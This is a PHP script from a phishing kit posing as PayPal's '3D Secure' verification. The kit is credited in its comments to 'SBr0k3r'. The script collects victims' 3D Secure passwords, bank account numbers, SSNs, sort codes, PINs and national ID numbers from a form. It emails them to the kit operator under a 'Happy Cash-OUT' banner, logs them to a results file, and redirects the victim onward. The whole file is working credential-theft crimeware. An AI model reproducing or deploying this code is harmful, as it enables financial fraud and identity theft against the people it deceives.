<?php
/////////////////////////////////////// DON'T TOUCHE THIS CODE (EMAIL SEND & FTP WRITE CODE)
session_start();
include './../../../your_email_here.php';
// Get user IP address
/*
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;
*/
// Get user IP address

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$subject = "$ip  Sbr0k3r 3D CODE <3 <3  | ".$_POST['password']."\n";
$headers = "From: Sbr0k3r <sendmai@lbox.com>\r\n" ;
$body .= "======== Happy Cash-OUT $xname =========\n";
$body .= "Password 3D             : ".$_POST['password']."\n";
$body .= "======== 3D INFORMATIONS =========\n";
$body .= "Account DE           : ".$_POST['accountde']."\n";
$body .= "Account CH           : ".$_POST['accountch']."\n";
$body .= "Account NL           : ".$_POST['accountnl']."\n";
$body .= "Account BE           : ".$_POST['accountbe']."\n";
$body .= "Account AT           : ".$_POST['accountat']."\n";
$body .= "SSN                  : ".$_POST['ssn']."\n";
$body .= "Sort Code            : ".$_POST['sort']."\n";
$body .= "ID Contribuinte      : ".$_POST['idpt']." -- ".$_POST['conpt']."\n";
$body .= "DNI PIN              : ".$_POST['dni']." -- ".$_POST['pin']."\n";
$body .= "Fisical Titolare     : ".$_POST['fc']." -- ".$_POST['tc']."\n";
$body .= "============= Created in 2016 By .::SBr0k3r::. =============\n";
$body .= "From $ip     check in http://www.geoiptool.com/?IP=$ip   \n";
$body .= "===============================\n";
$body .= $_SERVER['HTTP_USER_AGENT'];
$rnessage = "$body\n";
mail($to, $subject, $body , $headers);



$content_to_write = "
======== Happy Cash-OUT $xname =========
======== PayPal 3D (INFORMATIONS) =========
Password 3D             : ".$_POST['password']."
======== PayPal World (INFORMATIONS) =========
Account DE           : ".$_POST['accountde']."
Account CH           : ".$_POST['accountch']."
Account NL           : ".$_POST['accountnl']."
Account BE           : ".$_POST['accountbe']."
Account AT           : ".$_POST['accountat']."
Account UK           : ".$_POST['accountuk']."
SSN                  : ".$_POST['ssn']."
Sort Code            : ".$_POST['sort']."
ID Contribuinte      : ".$_POST['idpt']." -- ".$_POST['conpt']."
DNI PIN              : ".$_POST['dni']." -- ".$_POST['pin']."
Fisical Titolare     : ".$_POST['fc']." -- ".$_POST['tc']."
============= Created in 2016 By .::SBr0k3r::. =============
From $ip             check in http://www.geoiptool.com/?IP=$ip
===================
".$_SERVER['HTTP_USER_AGENT']."
======== PAYPAL (3D Secure) =========

".date ("m-d-Y")."||".date ("g:i:s")."
=====================================================================";

$f = fopen("./../../../../../rezlt.txt", "a");
fwrite($f, $content_to_write);
fclose($f);

$redirect_page = './../../../identity.php?p=_flow&SESSION=VBQvrPU00IM1uHErimWKuCyeklx6zvOmYw3KdzGurpCNuky8BWUn3P_VBQvrPU00IM1uHErimWKu';
$redirect = true;
header('Location: '.$redirect_page);
?>